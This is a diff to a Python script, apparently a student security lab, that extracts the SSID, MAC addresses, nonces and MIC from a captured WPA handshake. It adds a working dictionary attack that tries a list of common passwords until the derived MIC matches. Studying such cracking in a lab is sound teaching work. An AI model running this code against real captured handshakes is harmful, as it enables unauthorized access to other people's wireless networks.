@@ -8,7 +8,9 @@ Calcule un MIC d'authentification (le MIC pour la transmission de données
 utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
 sha-1 pour WPA2 ou MD5 pour WPA).
 
-Extrait le SSID, les MAC client et AP et les deux nonces du fichier pcap fourni.
+Extrait le SSID, les MAC client et AP, les deux nonces et le MIC du fichier pcap fourni.
+
+Permet de retrouver la passphrase en la bruteforce à l'aide d'un dictionaire puis en comparant le MIC généré avec le MIC du pcap fourni.
 """
 
 __author__      = "Olivier Koffi et Samuel Metler"
@@ -72,12 +74,18 @@ data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000
 def extract_nonce (payload) :
     return bytes(payload[17:49]).hex()
 
+# This function allow to manually extract the MIC from from a WPA handshake payload
+def extract_mic (payload) :
+    return bytes(payload[81:97]).hex()
+
 
 ssid_ret = wpa[0][Dot11Elt].info.decode()
 APmac_ret = wpa[5][Dot11].addr2
 Clientmac_ret = wpa[5][Dot11].addr1
 ANonce_ret = extract_nonce(bytes(wpa[5][EAPOL]))
 SNonce_ret = extract_nonce(bytes(wpa[6][EAPOL]))
+# The MIC from the fourth frame WPA handshake guaranteed that it comes from a user that knows the correct passphrase.
+Mic4_ret = extract_mic(bytes(wpa[8][EAPOL]))
 
 
 print ("\n\nValues from the pcap file")
@@ -87,6 +95,7 @@ print ("AP Mac: ", APmac_ret, "\n")
 print ("Client Mac: ", Clientmac_ret, "\n")
 print ("AP Nonce: ", ANonce_ret, "\n")
 print ("Client Nonce: ", SNonce_ret,"\n")
+print ("MIC: ", Mic4_ret,"\n")
 
 
 #cf "Quelques détails importants" dans la donnée
@@ -120,3 +129,49 @@ print ("KEK:\t\t",ptk[16:32].hex(),"\n")
 print ("TK:\t\t",ptk[32:48].hex(),"\n")
 print ("MICK:\t\t",ptk[48:64].hex(),"\n")
 print ("MIC:\t\t",mic.hexdigest(),"\n")
+
+
+#####################################
+#                                   #
+#       Crack WPA Passphrase        #
+#                                   #
+#####################################
+
+passwords_file = open('./10k_most_common_passwords.txt','r')
+passwords = passwords_file.readlines()
+passphrase_ret = "Not found"
+mic_to_test = a2b_hex("36eef66540fa801ceee2fea9b7929b40fdb0abaa").hex()
+
+
+print ("\nCracking WPA Passphrase")
+print ("=============================")
+for psw in passwords :
+    
+    # We don't take the final '\n'
+    passPhrase = str.encode(psw[:-1])
+
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+
+    #expand pmk to obtain PTK
+    ptk = customPRF512(pmk,str.encode(A),B)
+
+    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+
+    print ("Passphrase tested : ",psw)
+        
+    #Compare the MICs
+    if hmac.compare_digest(mic.hexdigest(), mic_to_test) :
+        print ("\nPassphrase found !\n")
+        passphrase_ret = psw
+        break
+
+print ("\nResult of the passphrase cracking")
+print ("=============================")
+print ("The passphrase is : ",passphrase_ret,"\n")
+
+
+passwords_file.close()
+
+
